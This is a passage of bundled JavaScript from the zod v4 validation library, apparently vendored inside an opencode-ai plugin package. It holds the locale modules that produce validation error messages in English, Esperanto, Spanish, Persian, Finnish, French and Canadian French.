    file: { unit: "bytes", verb: "to have" },
    array: { unit: "items", verb: "to have" },
    set: { unit: "items", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Invalid input: expected ${issue3.expected}, received ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive2(issue3.values[0])}`;
        return `Invalid option: expected one of ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Too big: expected ${issue3.origin ?? "value"} to have ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Too big: expected ${issue3.origin ?? "value"} to be ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Too small: expected ${issue3.origin} to have ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Too small: expected ${issue3.origin} to be ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Invalid string: must start with "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Invalid string: must end with "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Invalid string: must include "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Invalid string: must match pattern ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Invalid number: must be a multiple of ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Unrecognized key${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Invalid key in ${issue3.origin}`;
      case "invalid_union":
        return "Invalid input";
      case "invalid_element":
        return `Invalid value in ${issue3.origin}`;
      default:
        return `Invalid input`;
    }
  };
};
function en_default2() {
  return {
    localeError: error55()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/eo.js
var parsedType3 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "nombro";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "tabelo";
      }
      if (data === null) {
        return "senvalora";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error56 = () => {
  const Sizable = {
    string: { unit: "karaktrojn", verb: "havi" },
    file: { unit: "bajtojn", verb: "havi" },
    array: { unit: "elementojn", verb: "havi" },
    set: { unit: "elementojn", verb: "havi" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "enigo",
    email: "retadreso",
    url: "URL",
    emoji: "emo\u011Dio",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datotempo",
    date: "ISO-dato",
    time: "ISO-tempo",
    duration: "ISO-da\u016Dro",
    ipv4: "IPv4-adreso",
    ipv6: "IPv6-adreso",
    cidrv4: "IPv4-rango",
    cidrv6: "IPv6-rango",
    base64: "64-ume kodita karaktraro",
    base64url: "URL-64-ume kodita karaktraro",
    json_string: "JSON-karaktraro",
    e164: "E.164-nombro",
    jwt: "JWT",
    template_literal: "enigo"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Nevalida enigo: atendi\u011Dis ${issue3.expected}, ricevi\u011Dis ${parsedType3(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Nevalida enigo: atendi\u011Dis ${stringifyPrimitive2(issue3.values[0])}`;
        return `Nevalida opcio: atendi\u011Dis unu el ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Tro granda: atendi\u011Dis ke ${issue3.origin ?? "valoro"} havu ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementojn"}`;
        return `Tro granda: atendi\u011Dis ke ${issue3.origin ?? "valoro"} havu ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Tro malgranda: atendi\u011Dis ke ${issue3.origin} havu ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Tro malgranda: atendi\u011Dis ke ${issue3.origin} estu ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Nevalida karaktraro: devas komenci\u011Di per "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nevalida karaktraro: devas fini\u011Di per "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nevalida karaktraro: devas inkluzivi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nevalida karaktraro: devas kongrui kun la modelo ${_issue.pattern}`;
        return `Nevalida ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Nevalida nombro: devas esti oblo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nekonata${issue3.keys.length > 1 ? "j" : ""} \u015Dlosilo${issue3.keys.length > 1 ? "j" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Nevalida \u015Dlosilo en ${issue3.origin}`;
      case "invalid_union":
        return "Nevalida enigo";
      case "invalid_element":
        return `Nevalida valoro en ${issue3.origin}`;
      default:
        return `Nevalida enigo`;
    }
  };
};
function eo_default2() {
  return {
    localeError: error56()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/es.js
var error57 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "tener" },
    file: { unit: "bytes", verb: "tener" },
    array: { unit: "elementos", verb: "tener" },
    set: { unit: "elementos", verb: "tener" }
  };
  const TypeNames = {
    string: "texto",
    number: "n\xFAmero",
    boolean: "booleano",
    array: "arreglo",
    object: "objeto",
    set: "conjunto",
    file: "archivo",
    date: "fecha",
    bigint: "n\xFAmero grande",
    symbol: "s\xEDmbolo",
    undefined: "indefinido",
    null: "nulo",
    function: "funci\xF3n",
    map: "mapa",
    record: "registro",
    tuple: "tupla",
    enum: "enumeraci\xF3n",
    union: "uni\xF3n",
    literal: "literal",
    promise: "promesa",
    void: "vac\xEDo",
    never: "nunca",
    unknown: "desconocido",
    any: "cualquiera"
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  function getTypeName(type) {
    return TypeNames[type] ?? type;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype) {
          return data.constructor.name;
        }
        return "object";
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entrada",
    email: "direcci\xF3n de correo electr\xF3nico",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "fecha y hora ISO",
    date: "fecha ISO",
    time: "hora ISO",
    duration: "duraci\xF3n ISO",
    ipv4: "direcci\xF3n IPv4",
    ipv6: "direcci\xF3n IPv6",
    cidrv4: "rango IPv4",
    cidrv6: "rango IPv6",
    base64: "cadena codificada en base64",
    base64url: "URL codificada en base64",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entrada inv\xE1lida: se esperaba ${getTypeName(issue3.expected)}, recibido ${getTypeName(parsedType4(issue3.input))}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entrada inv\xE1lida: se esperaba ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opci\xF3n inv\xE1lida: se esperaba una de ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing)
          return `Demasiado grande: se esperaba que ${origin ?? "valor"} tuviera ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Demasiado grande: se esperaba que ${origin ?? "valor"} fuera ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing) {
          return `Demasiado peque\xF1o: se esperaba que ${origin} tuviera ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Demasiado peque\xF1o: se esperaba que ${origin} fuera ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Cadena inv\xE1lida: debe comenzar con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cadena inv\xE1lida: debe terminar en "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cadena inv\xE1lida: debe incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cadena inv\xE1lida: debe coincidir con el patr\xF3n ${_issue.pattern}`;
        return `Inv\xE1lido ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: debe ser m\xFAltiplo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Llave${issue3.keys.length > 1 ? "s" : ""} desconocida${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Llave inv\xE1lida en ${getTypeName(issue3.origin)}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido en ${getTypeName(issue3.origin)}`;
      default:
        return `Entrada inv\xE1lida`;
    }
  };
};
function es_default2() {
  return {
    localeError: error57()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fa.js
var error58 = () => {
  const Sizable = {
    string: { unit: "\u06A9\u0627\u0631\u0627\u06A9\u062A\u0631", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    file: { unit: "\u0628\u0627\u06CC\u062A", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    array: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    set: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0639\u062F\u062F";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0622\u0631\u0627\u06CC\u0647";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0648\u0631\u0648\u062F\u06CC",
    email: "\u0622\u062F\u0631\u0633 \u0627\u06CC\u0645\u06CC\u0644",
    url: "URL",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u06CC\u062E \u0648 \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    date: "\u062A\u0627\u0631\u06CC\u062E \u0627\u06CC\u0632\u0648",
    time: "\u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    duration: "\u0645\u062F\u062A \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    ipv4: "IPv4 \u0622\u062F\u0631\u0633",
    ipv6: "IPv6 \u0622\u062F\u0631\u0633",
    cidrv4: "IPv4 \u062F\u0627\u0645\u0646\u0647",
    cidrv6: "IPv6 \u062F\u0627\u0645\u0646\u0647",
    base64: "base64-encoded \u0631\u0634\u062A\u0647",
    base64url: "base64url-encoded \u0631\u0634\u062A\u0647",
    json_string: "JSON \u0631\u0634\u062A\u0647",
    e164: "E.164 \u0639\u062F\u062F",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u06CC"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${issue3.expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${parsedType4(issue3.input)} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
      case "invalid_value":
        if (issue3.values.length === 1) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${stringifyPrimitive2(issue3.values[0])} \u0645\u06CC\u200C\u0628\u0648\u062F`;
        }
        return `\u06AF\u0632\u06CC\u0646\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A \u06CC\u06A9\u06CC \u0627\u0632 ${joinValues2(issue3.values, "|")} \u0645\u06CC\u200C\u0628\u0648\u062F`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue3.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue3.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.prefix}" \u0634\u0631\u0648\u0639 \u0634\u0648\u062F`;
        }
        if (_issue.format === "ends_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.suffix}" \u062A\u0645\u0627\u0645 \u0634\u0648\u062F`;
        }
        if (_issue.format === "includes") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0634\u0627\u0645\u0644 "${_issue.includes}" \u0628\u0627\u0634\u062F`;
        }
        if (_issue.format === "regex") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 \u0627\u0644\u06AF\u0648\u06CC ${_issue.pattern} \u0645\u0637\u0627\u0628\u0642\u062A \u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F`;
        }
        return `${Nouns[_issue.format] ?? issue3.format} \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      }
      case "not_multiple_of":
        return `\u0639\u062F\u062F \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0645\u0636\u0631\u0628 ${issue3.divisor} \u0628\u0627\u0634\u062F`;
      case "unrecognized_keys":
        return `\u06A9\u0644\u06CC\u062F${issue3.keys.length > 1 ? "\u0647\u0627\u06CC" : ""} \u0646\u0627\u0634\u0646\u0627\u0633: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u06A9\u0644\u06CC\u062F \u0646\u0627\u0634\u0646\u0627\u0633 \u062F\u0631 ${issue3.origin}`;
      case "invalid_union":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      case "invalid_element":
        return `\u0645\u0642\u062F\u0627\u0631 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u062F\u0631 ${issue3.origin}`;
      default:
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
    }
  };
};
function fa_default2() {
  return {
    localeError: error58()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fi.js
var error59 = () => {
  const Sizable = {
    string: { unit: "merkki\xE4", subject: "merkkijonon" },
    file: { unit: "tavua", subject: "tiedoston" },
    array: { unit: "alkiota", subject: "listan" },
    set: { unit: "alkiota", subject: "joukon" },
    number: { unit: "", subject: "luvun" },
    bigint: { unit: "", subject: "suuren kokonaisluvun" },
    int: { unit: "", subject: "kokonaisluvun" },
    date: { unit: "", subject: "p\xE4iv\xE4m\xE4\xE4r\xE4n" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "s\xE4\xE4nn\xF6llinen lauseke",
    email: "s\xE4hk\xF6postiosoite",
    url: "URL-osoite",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-aikaleima",
    date: "ISO-p\xE4iv\xE4m\xE4\xE4r\xE4",
    time: "ISO-aika",
    duration: "ISO-kesto",
    ipv4: "IPv4-osoite",
    ipv6: "IPv6-osoite",
    cidrv4: "IPv4-alue",
    cidrv6: "IPv6-alue",
    base64: "base64-koodattu merkkijono",
    base64url: "base64url-koodattu merkkijono",
    json_string: "JSON-merkkijono",
    e164: "E.164-luku",
    jwt: "JWT",
    template_literal: "templaattimerkkijono"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Virheellinen tyyppi: odotettiin ${issue3.expected}, oli ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Virheellinen sy\xF6te: t\xE4ytyy olla ${stringifyPrimitive2(issue3.values[0])}`;
        return `Virheellinen valinta: t\xE4ytyy olla yksi seuraavista: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Liian suuri: ${sizing.subject} t\xE4ytyy olla ${adj}${issue3.maximum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian suuri: arvon t\xE4ytyy olla ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Liian pieni: ${sizing.subject} t\xE4ytyy olla ${adj}${issue3.minimum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian pieni: arvon t\xE4ytyy olla ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy alkaa "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy loppua "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Virheellinen sy\xF6te: t\xE4ytyy sis\xE4lt\xE4\xE4 "${_issue.includes}"`;
        if (_issue.format === "regex") {
          return `Virheellinen sy\xF6te: t\xE4ytyy vastata s\xE4\xE4nn\xF6llist\xE4 lauseketta ${_issue.pattern}`;
        }
        return `Virheellinen ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Virheellinen luku: t\xE4ytyy olla luvun ${issue3.divisor} monikerta`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Tuntemattomat avaimet" : "Tuntematon avain"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return "Virheellinen avain tietueessa";
      case "invalid_union":
        return "Virheellinen unioni";
      case "invalid_element":
        return "Virheellinen arvo joukossa";
      default:
        return `Virheellinen sy\xF6te`;
    }
  };
};
function fi_default2() {
  return {
    localeError: error59()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fr.js
var error60 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "nombre";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tableau";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entr\xE9e",
    email: "adresse e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date et heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entr\xE9e invalide : ${issue3.expected} attendu, ${parsedType4(issue3.input)} re\xE7u`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entr\xE9e invalide : ${stringifyPrimitive2(issue3.values[0])} attendu`;
        return `Option invalide : une valeur parmi ${joinValues2(issue3.values, "|")} attendue`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Trop grand : ${issue3.origin ?? "valeur"} doit ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\xE9l\xE9ment(s)"}`;
        return `Trop grand : ${issue3.origin ?? "valeur"} doit \xEAtre ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Trop petit : ${issue3.origin} doit ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : ${issue3.origin} doit \xEAtre ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au mod\xE8le ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue3.keys.length > 1 ? "s" : ""} non reconnue${issue3.keys.length > 1 ? "s" : ""} : ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Cl\xE9 invalide dans ${issue3.origin}`;
      case "invalid_union":
        return "Entr\xE9e invalide";
      case "invalid_element":
        return `Valeur invalide dans ${issue3.origin}`;
      default:
        return `Entr\xE9e invalide`;
    }
  };
};
function fr_default2() {
  return {
    localeError: error60()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fr-CA.js
var error61 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entr\xE9e",
    email: "adresse courriel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date-heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entr\xE9e invalide : attendu ${issue3.expected}, re\xE7u ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entr\xE9e invalide : attendu ${stringifyPrimitive2(issue3.values[0])}`;
        return `Option invalide : attendu l'une des valeurs suivantes ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u2264" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Trop grand : attendu que ${issue3.origin ?? "la valeur"} ait ${adj}${issue3.maximum.toString()} ${sizing.unit}`;
        return `Trop grand : attendu que ${issue3.origin ?? "la valeur"} soit ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u2265" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Trop petit : attendu que ${issue3.origin} ait ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : attendu que ${issue3.origin} soit ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au motif ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} invalide`;
      }
      case "not_multiple_of":
